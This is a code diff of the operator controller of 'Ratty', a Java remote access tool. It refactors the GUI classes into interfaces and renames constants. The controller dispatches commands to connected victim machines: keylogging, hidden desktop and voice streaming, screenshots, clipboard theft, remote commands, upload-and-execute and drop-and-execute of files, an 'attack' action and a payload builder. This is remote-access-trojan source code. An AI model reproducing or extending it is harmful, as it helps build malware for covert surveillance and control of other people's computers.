@@ -69,9 +69,9 @@ import de.sogomn.rat.util.XorCipher;
  */
 public final class RattyGuiController extends AbstractRattyController implements IGuiController {
 	
-	private AbstractRattyGui gui;
-	private BuilderGui builder;
-	private ServerListGui serverList;
+	private IRattyGui gui;
+	private IBuilderGui builder;
+	private IServerListGui serverList;
 	private JFileChooser fileChooser;
 	
 	private HashMap<ActiveConnection, ServerClient> clients;
@@ -146,8 +146,10 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	private static final Sound PING = Sound.loadSound("/ping.wav");
 	
-	public RattyGuiController(final AbstractRattyGui gui) {
+	public RattyGuiController(final IRattyGui gui, final IBuilderGui builder, final IServerListGui serverList) {
 		this.gui = gui;
+		this.builder = builder;
+		this.serverList = serverList;
 		
 		final Thread pingThread = new Thread(() -> {
 			while (true) {
@@ -163,14 +165,11 @@ public final class RattyGuiController extends AbstractRattyController implements
 			}
 		}, "Ping");
 		
-		builder = new BuilderGui();
-		serverList = new ServerListGui();
 		fileChooser = new JFileChooser();
 		clients = new HashMap<ActiveConnection, ServerClient>();
 		
 		fileChooser.setCurrentDirectory(Constants.JAR_FILE);
 		serverList.addListener(this);
-		builder.addListener(this);
 		
 		pingThread.setDaemon(true);
 		pingThread.start();
@@ -527,7 +526,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 			}
 		}
 		
-		builder.removeListEntries();
+		builder.clearListEntries();
 		builder.setVisible(false);
 	}
 	
@@ -539,7 +538,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 			
 			builder.setFileName(name);
 		} else {
-			builder.setFileName(BuilderGui.NO_FILE);
+			builder.setFileName(BuilderSwingGui.NO_FILE);
 		}
 	}
 	
@@ -586,16 +585,19 @@ public final class RattyGuiController extends AbstractRattyController implements
 			server.close();
 		}
 		
-		servers.clear();
-		
+		serverList.removeAllListeners();
+		serverList.close();
 		builder.removeAllListeners();
 		builder.close();
+		gui.removeAllListeners();
+		gui.close();
+		servers.clear();
 		
 		System.exit(0);
 	}
 	
 	private void startServer() {
-		final String portString = serverList.getPort();
+		final String portString = serverList.getPortInput();
 		
 		try {
 			final int port = Integer.parseInt(portString);
@@ -624,19 +626,19 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private void handleCommand(final ServerClient client, final String command) {
-		if (command == RattyGui.FILES) {
+		if (command == RattySwingGui.FILES) {
 			client.fileTree.setVisible(true);
 		} else if (command == DisplayPanel.CLOSED) {
 			stopDesktopStream(client);
-		} else if (command == RattyGui.DESKTOP) {
+		} else if (command == RattySwingGui.DESKTOP) {
 			toggleDesktopStream(client);
-		} else if (command == RattyGui.VOICE) {
+		} else if (command == RattySwingGui.VOICE) {
 			toggleVoiceStream(client);
 		} else if (command == FileTree.REQUEST) {
 			requestFile(client);
-		} else if (command == RattyGui.CHAT) {
+		} else if (command == RattySwingGui.CHAT) {
 			client.chat.setVisible(true);
-		} else if (command == RattyGui.KEYLOG) {
+		} else if (command == RattySwingGui.KEYLOG) {
 			client.logger.setVisible(true);
 		} else if (command == LoggingGui.CLEAR) {
 			client.logger.clear();
@@ -644,25 +646,25 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private void handleGlobalCommand(final String command) {
-		if (command == RattyGui.CLOSE) {
+		if (command == RattySwingGui.CLOSE) {
 			exit();
-		} else if (command == RattyGui.BUILD) {
+		} else if (command == RattySwingGui.BUILD) {
 			builder.setVisible(true);
-		} else if (command == BuilderGui.CHOOSE) {
+		} else if (command == BuilderSwingGui.CHOOSE) {
 			selectBuilderFile();
-		} else if (command == BuilderGui.BUILD) {
+		} else if (command == BuilderSwingGui.BUILD) {
 			build();
-		} else if (command == RattyGui.ATTACK) {
+		} else if (command == RattySwingGui.ATTACK) {
 			launchAttack();
-		} else if (command == BuilderGui.ADD) {
+		} else if (command == BuilderSwingGui.ADD) {
 			addBuilderEntry();
-		} else if (command == BuilderGui.REMOVE) {
+		} else if (command == BuilderSwingGui.REMOVE) {
 			removeBuilderEntry();
-		} else if (command == RattyGui.MANAGE_SERVERS) {
+		} else if (command == RattySwingGui.MANAGE_SERVERS) {
 			serverList.setVisible(true);
-		} else if (command == ServerListGui.START) {
+		} else if (command == ServerListSwingGui.START) {
 			startServer();
-		} else if (command == ServerListGui.STOP) {
+		} else if (command == ServerListSwingGui.STOP) {
 			stopServer();
 		}
 	}
@@ -670,21 +672,21 @@ public final class RattyGuiController extends AbstractRattyController implements
 	private IPacket createPacket(final ServerClient client, final String command) {
 		IPacket packet = null;
 		
-		if (command == RattyGui.FREE) {
+		if (command == RattySwingGui.FREE) {
 			packet = createFreePacket();
-		} else if (command == RattyGui.POPUP) {
+		} else if (command == RattySwingGui.POPUP) {
 			packet = createPopupPacket();
-		} else if (command == RattyGui.CLIPBOARD) {
+		} else if (command == RattySwingGui.CLIPBOARD) {
 			packet = new ClipboardPacket();
-		} else if (command == RattyGui.COMMAND) {
+		} else if (command == RattySwingGui.COMMAND) {
 			packet = createCommandPacket();
-		} else if (command == RattyGui.SCREENSHOT) {
+		} else if (command == RattySwingGui.SCREENSHOT) {
 			packet = new ScreenshotPacket();
-		} else if (command == RattyGui.WEBSITE) {
+		} else if (command == RattySwingGui.WEBSITE) {
 			packet = createWebsitePacket();
-		} else if (command == RattyGui.DESKTOP) {
+		} else if (command == RattySwingGui.DESKTOP) {
 			packet = new DesktopPacket(true);
-		} else if (command == RattyGui.AUDIO) {
+		} else if (command == RattySwingGui.AUDIO) {
 			packet = createAudioPacket();
 		} else if (command == FileTree.DOWNLOAD) {
 			packet = createDownloadPacket(client);
@@ -698,27 +700,27 @@ public final class RattyGuiController extends AbstractRattyController implements
 			packet = createDirectoryPacket(client);
 		} else if (command == FileTree.DROP_FILE) {
 			packet = createDownloadUrlPacket(client);
-		} else if (command == RattyGui.UPLOAD_EXECUTE) {
+		} else if (command == RattySwingGui.UPLOAD_EXECUTE) {
 			packet = createUploadExecutePacket(client);
-		} else if (command == RattyGui.DROP_EXECUTE) {
+		} else if (command == RattySwingGui.DROP_EXECUTE) {
 			packet = createDropExecutePacket(client);
 		} else if (command == ChatWindow.MESSAGE_SENT) {
 			packet = createChatPacket(client);
 		} else if (command == FileTree.INFORMATION) {
 			packet = createFileInformationPacket(client);
-		} else if (command == RattyGui.INFORMATION) {
+		} else if (command == RattySwingGui.INFORMATION) {
 			packet = new ComputerInfoPacket();
-		} else if (command == RattyGui.UNINSTALL) {
+		} else if (command == RattySwingGui.UNINSTALL) {
 			packet = createUninstallPacket();
-		} else if (command == RattyGui.SHUT_DOWN) {
+		} else if (command == RattySwingGui.SHUT_DOWN) {
 			packet = new ShutdownPacket();
 		} else if (command == DisplayPanel.MOUSE_EVENT && client.isStreamingDesktop()) {
 			packet = client.displayPanel.getLastMouseEventPacket();
 		} else if (command == DisplayPanel.KEY_EVENT && client.isStreamingDesktop()) {
 			packet = client.displayPanel.getLastKeyEventPacket();
-		} else if (command == RattyGui.VOICE && !client.isStreamingVoice()) {
+		} else if (command == RattySwingGui.VOICE && !client.isStreamingVoice()) {
 			packet = new VoicePacket();
-		} else if (command == RattyGui.RESTART) {
+		} else if (command == RattySwingGui.RESTART) {
 			packet = new RestartPacket();
 		}
 		
@@ -946,13 +948,13 @@ public final class RattyGuiController extends AbstractRattyController implements
 	@Override
 	public void startServer(final int port) {
 		final String portString = String.valueOf(port);
-		final boolean contains = serverList.contains(portString);
+		final boolean contains = serverList.containsListEntry(portString);
 		
 		super.startServer(port);
 		
 		if (!contains) {
-			serverList.addItem(portString);
-			serverList.setPort("");
+			serverList.addListEntry(portString);
+			serverList.setPortInput("");
 		}
 	}
 	
@@ -962,7 +964,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		
 		super.stopServer(port);
 		
-		serverList.removeItem(portString);
+		serverList.removeListEntry(portString);
 	}
 	
 	@Override
@@ -1024,7 +1026,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		
 		super.closed(server);
 		
-		serverList.removeItem(portString);
+		serverList.removeListEntry(portString);
 	}
 	
 	@Override
@@ -1033,8 +1035,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 		
 		if (source instanceof ServerClient) {
 			client = (ServerClient)source;
-		} else if (source instanceof AbstractRattyGui) {
-			final AbstractRattyGui gui = (AbstractRattyGui)source;
+		} else if (source instanceof IRattyGui) {
+			final IRattyGui gui = (IRattyGui)source;
 			
 			client = gui.getSelectedClient();
 		} else {
